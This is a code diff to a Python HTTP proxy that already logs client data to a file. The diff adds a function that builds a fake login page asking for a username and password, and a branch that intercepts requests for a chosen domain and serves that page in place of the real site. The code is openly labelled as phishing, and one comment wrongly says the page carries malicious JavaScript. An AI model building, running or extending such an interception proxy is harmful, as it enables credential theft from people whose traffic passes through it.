@@ -10,6 +10,27 @@ DEBUG = True
 PROXY_IP = None
 PROXY_IP_INTERFACE = "0.0.0.0"
 
+def generate_phishing_page():
+    if DEBUG:
+        print("Generating phishing page...")
+    html_content = """
+    <html>
+    <head><title>Example</title></head>
+    <body>
+    <h1>Login Page</h1>
+    <p>This is a secure login. Please, enter details below.</p>
+    <form action="http://example.com/login" method="post">
+        <label for="username"> Username: </label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password"> Password: </label><br>
+        <input type="password" id="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+    </body>
+    </html>
+    """
+    return html_content
+
 def parse_and_log_client_data(request_data):
     """
     Parses the GET request with client data and logs it to info2.txt.
@@ -105,6 +126,14 @@ def handle_active_client(client_socket):
 
     print("Received request")
 
+    host, port = get_destination_host_port(request)
+    # Check if request is for the predefined domain for phishing
+    if host == "example.com":
+        # Send a phishing page (malicious JavaScript)
+        client_socket.send(generate_phishing_page().encode('utf-8'))
+        client_socket.close()
+        return
+
      # Handle the GET request with client data
     if '/?user-agent=' in request:
         parse_and_log_client_data(request)
@@ -113,7 +142,7 @@ def handle_active_client(client_socket):
         client_socket.close()
         return
 
-    host, port = get_destination_host_port(request)
+
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.connect((host, 80))
     server_socket.send(request.encode('utf-8'))
